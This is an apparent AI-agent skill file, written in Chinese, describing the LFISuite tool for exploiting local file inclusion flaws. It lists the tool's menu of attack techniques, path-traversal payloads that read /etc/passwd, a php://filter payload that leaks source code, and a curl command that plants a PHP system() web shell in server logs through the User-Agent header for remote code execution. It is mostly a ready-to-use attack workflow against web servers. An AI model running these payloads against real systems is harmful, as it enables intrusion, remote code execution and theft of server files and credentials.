---
name: lfisuite
description: >
  此技能适用于用户询问关于"lfisuite"、"测试和利用 LFI 漏洞以通过日志投毒实现 RCE"、"/proc 文件包含"。具备路径遍历和日志投毒功能的自动化本地文件包含 (LFI) 测试与利用工具。
---

# LFISuite

自动化 LFI 测试与利用工具 — 路径遍历、日志投毒、RCE。

## 快速开始

```bash
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite && python3 lfisuite.py

# 或直接运行（交互式）
python3 lfisuite.py
```

## 交互菜单选项

| 选项 | 用途 |
|------|------|
| 1 | 自动利用（所有技术） |
| 2 | /etc/passwd 文件包含 |
| 3 | 日志投毒（Apache/Nginx） |
| 4 | /proc/self/environ |
| 5 | PHP 封装器（expect://） |
| 6 | PHP 封装器（php://filter） |
| 7 | PHP 封装器（php://input） |
| 8 | 远程文件包含 (RFI) |

## 常用工作流

**先手动确认 LFI：**
```
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=....//....//etc/passwd
http://target.com/page.php?file=%2fetc%2fpasswd
```

**日志投毒实现 RCE：**
1. 通过 curl 向 User-Agent 请求头注入 PHP：
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```
2. 通过 LFI 包含日志文件 → 执行 `cmd=id`

**PHP filter 读取源码：**
```
?file=php://filter/convert.base64-encode/resource=index.php
```

## 参考资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | 封装器技术和过滤器绕过 |
